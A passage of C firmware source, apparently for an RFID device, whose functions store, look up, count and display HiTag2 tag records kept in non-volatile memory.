    uint32_t count = 0;
    NVMProgram((void *) HITAG2_NVM_ADDRESS, (const void *) &count, sizeof(uint32_t), (void*) TmpBuff);
}

BOOL hitag2_nvm_store_tag(BYTE *tag)
{
    uint32_t count;
    BYTE *entry;
    
    memcpy(&count, (void *)HITAG2_NVM_ADDRESS, 4);
    
//    UserMessage("current count: %d\r\n", count);
    
    if (count >= HITAG2_NVM_MAX)
    {
        return FALSE;
    }
        
    entry = hitag2_nvm_find_tag(tag);
    
    if (entry)
    {
        // UID already exists
        return TRUE;
    }
    
    // store tag
    entry = (BYTE *)HITAG2_NVM_DATA + (64 * count);
    NVMProgram((void *) entry, (const void *) tag, 64, (void*) TmpBuff);
    
    // update count
    count++;
    NVMProgram((void *) HITAG2_NVM_ADDRESS, (const void *) &count, sizeof(uint32_t), (void*) TmpBuff);
    return TRUE;
    
}

BYTE *hitag2_nvm_find_tag(BYTE *tag)
{
    BYTE *entry = NULL;
    uint32_t index = 0;
    uint32_t count;
    
    memcpy(&count, (void *)HITAG2_NVM_ADDRESS, 4);
    
    if (count > HITAG2_NVM_MAX)
    {
        UserMessage("hitag2_find_tag: count is invalid\r\n");
        return NULL;
    }
    
    // loop over entries
    for (index=0, entry=(BYTE *)HITAG2_NVM_DATA; index<count; index++, entry += 64)
    {
        // see if this entry matches tag
        if (memcmp(tag, entry, 64) == 0)
        {
            return entry;
        }
    }
    
    // not found
    return FALSE;
}

BOOL hitag2_nvm_count_tags()
{
    uint32_t count;
    
    memcpy(&count, (void *)HITAG2_NVM_ADDRESS, 4);
    
    UserMessage("\r\n");
    
    if (count > HITAG2_NVM_MAX)
    {
        UserMessage("Invalid NVM counter\r\n");
        return FALSE;
    }
    
    UserMessage("%d tags stored\r\n", count);
    return TRUE;
}

BOOL hitag2_nvm_display_tags(uint32_t start, uint32_t end)
{
    uint32_t count;
    uint32_t index;
    int i;
    BYTE tmp[9];
    
    memcpy(&count, (void *)HITAG2_NVM_ADDRESS, 4);
    
    UserMessage("\r\n");
    
    if (count == 0)
    {
        UserMessage("No HiTag2 tags stored\r\n");
        return TRUE;
    }
    
    if (!start)
    {
        start = 1;
        end = count;
    }
    
    if ((count > HITAG2_NVM_MAX) || (start > count) || (end < start) || (end > count))
    {
        UserMessage("Invalid tag selection\r\n");
        return FALSE;
    }
    
    tmp[8] = 0x00;
    for (index=start; index<=end; index++)
    {
        UserMessage("Tag number %d\r\n", index);
        for (i=0; i<8; i++)
        {
            UserMessage("%d: ", i);
            memcpy(tmp, (BYTE *)HITAG2_NVM_DATA + ((index - 1) * 64) + (i * 8), 8);
            UserMessage("%s\r\n", tmp);
        }
        UserMessage("\r\n");
    }
    
    return TRUE;
}